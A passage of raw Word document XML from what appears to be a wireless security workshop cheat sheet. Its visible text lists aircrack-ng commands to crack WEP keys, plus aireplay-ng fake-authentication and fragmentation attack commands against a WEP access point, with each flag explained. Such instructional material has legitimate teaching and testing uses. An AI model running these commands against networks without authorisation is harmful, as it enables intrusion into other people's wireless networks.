          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>/*</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="006D3FA1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>pcapdump</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="351A1192" w14:textId="77777777" w:rsidR="00013AE1" w:rsidRDefault="00013AE1" w:rsidP="00013AE1">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="39AC5F9B" w14:textId="69D6D911" w:rsidR="00013AE1" w:rsidRPr="002D638E" w:rsidRDefault="00013AE1" w:rsidP="00013AE1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="002A56B4">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>ircrack</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> -K -b </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>AP_mac</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="002A56B4">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00C70BD1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>/root/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>kismet/*.cap</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4420CEDA" w14:textId="77777777" w:rsidR="00013AE1" w:rsidRDefault="00013AE1" w:rsidP="00013AE1">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1E871EF7" w14:textId="1A82BC5B" w:rsidR="006D3FA1" w:rsidRPr="006D3FA1" w:rsidRDefault="006D3FA1" w:rsidP="006D3FA1">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="2"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="006D3FA1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>Crack WEP</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06A2DEA5" w14:textId="784C77E4" w:rsidR="006D3FA1" w:rsidRPr="006D3FA1" w:rsidRDefault="006D3FA1" w:rsidP="006D3FA1">
      <w:pPr>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="006D3FA1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>aircrack-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="006D3FA1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> /</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>tmp/*pcapdump</w:t>
      </w:r>
      <w:bookmarkStart w:id="0" w:name="_GoBack"/>
      <w:bookmarkEnd w:id="0"/>
    </w:p>
    <w:p w14:paraId="31441B96" w14:textId="77777777" w:rsidR="006D3FA1" w:rsidRPr="006D3FA1" w:rsidRDefault="006D3FA1" w:rsidP="006D3FA1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1CE31373" w14:textId="6F3ACC04" w:rsidR="006D3FA1" w:rsidRPr="006D3FA1" w:rsidRDefault="006D3FA1" w:rsidP="006D3FA1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="006D3FA1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>aircrack</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="006D3FA1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="006D3FA1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> -b 00:14:6C:7E:40:80 </w:t>
      </w:r>
      <w:r w:rsidRPr="006D3FA1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>tmp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>/*</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>pcapdump</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="4E6DE0F8" w14:textId="77777777" w:rsidR="006D3FA1" w:rsidRPr="006D3FA1" w:rsidRDefault="006D3FA1" w:rsidP="006D3FA1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="685C5ACA" w14:textId="65704154" w:rsidR="006D3FA1" w:rsidRPr="006D3FA1" w:rsidRDefault="006D3FA1" w:rsidP="006D3FA1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="006D3FA1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>aircrack</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="006D3FA1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="006D3FA1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> -K -b 00:14:6C:7E:40:80 </w:t>
      </w:r>
      <w:r w:rsidRPr="006D3FA1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>tmp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>/*</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>pcapdump</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="2F0E94DE" w14:textId="77777777" w:rsidR="006D3FA1" w:rsidRPr="00013AE1" w:rsidRDefault="006D3FA1" w:rsidP="006D3FA1">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1F1CFC1A" w14:textId="2419A71B" w:rsidR="003975DE" w:rsidRDefault="00A202A3" w:rsidP="00A202A3">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="2"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">Do fake </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>auth</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> against WEP Aps</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="167419BB" w14:textId="77777777" w:rsidR="00A202A3" w:rsidRPr="002A56B4" w:rsidRDefault="00A202A3" w:rsidP="00A202A3">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="002A56B4">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>aireplay</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="002A56B4">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="002A56B4">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> -1 0 -e BSIDES -a 00:14:6C:7E:40:80 -h 00:09:5B:EC:EE:F2 wlan0mon</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F0BD2AD" w14:textId="2BE51718" w:rsidR="00A202A3" w:rsidRDefault="00A202A3" w:rsidP="00A202A3">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ab/>
      </w:r>
    </w:p>
    <w:p w14:paraId="039E3C73" w14:textId="77777777" w:rsidR="00A202A3" w:rsidRDefault="00A202A3" w:rsidP="00A202A3">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Where:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6881B628" w14:textId="77777777" w:rsidR="00A202A3" w:rsidRDefault="00A202A3" w:rsidP="00A202A3">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="10"/>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-1 means fake authentication</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53360714" w14:textId="77777777" w:rsidR="00A202A3" w:rsidRDefault="00A202A3" w:rsidP="00A202A3">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="10"/>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0 </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>reassociation</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> timing in seconds</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5ABA6F58" w14:textId="77777777" w:rsidR="00A202A3" w:rsidRDefault="00A202A3" w:rsidP="00A202A3">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="10"/>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e</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> BSIDES is the wireless network name</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D4E5E15" w14:textId="77777777" w:rsidR="00A202A3" w:rsidRDefault="00A202A3" w:rsidP="00A202A3">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="10"/>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a</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> 00:14:6C:7E:40:80 is the access point MAC address</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="027C20AD" w14:textId="77777777" w:rsidR="00A202A3" w:rsidRDefault="00A202A3" w:rsidP="00A202A3">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="10"/>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00:09:5B:EC:EE:F2 is our card MAC address</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6EFE468A" w14:textId="77777777" w:rsidR="00A202A3" w:rsidRDefault="00A202A3" w:rsidP="00A202A3">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="10"/>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Pr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> is the wireless interface name</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="136FD4ED" w14:textId="77777777" w:rsidR="00A202A3" w:rsidRPr="00A202A3" w:rsidRDefault="00A202A3" w:rsidP="00A202A3">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="1080"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6FF0C71D" w14:textId="4C660F52" w:rsidR="00A202A3" w:rsidRPr="00A202A3" w:rsidRDefault="00A202A3" w:rsidP="00A202A3">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="2"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>Do frag attack against WEP APs</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F105555" w14:textId="77777777" w:rsidR="00A202A3" w:rsidRPr="00A202A3" w:rsidRDefault="00A202A3" w:rsidP="00A202A3">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00A202A3">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>aireplay</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00A202A3">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00A202A3">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> -5 -b 00:14:6C:7E:40:80 -h 00:09:5B:EC:EE:F2 wlan0mon</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A3F0784" w14:textId="77777777" w:rsidR="00A202A3" w:rsidRDefault="00A202A3" w:rsidP="00A202A3">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3A70EA2B" w14:textId="42A13A23" w:rsidR="00EB10B7" w:rsidRPr="00A202A3" w:rsidRDefault="00A202A3" w:rsidP="00A202A3">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="2"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A202A3">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
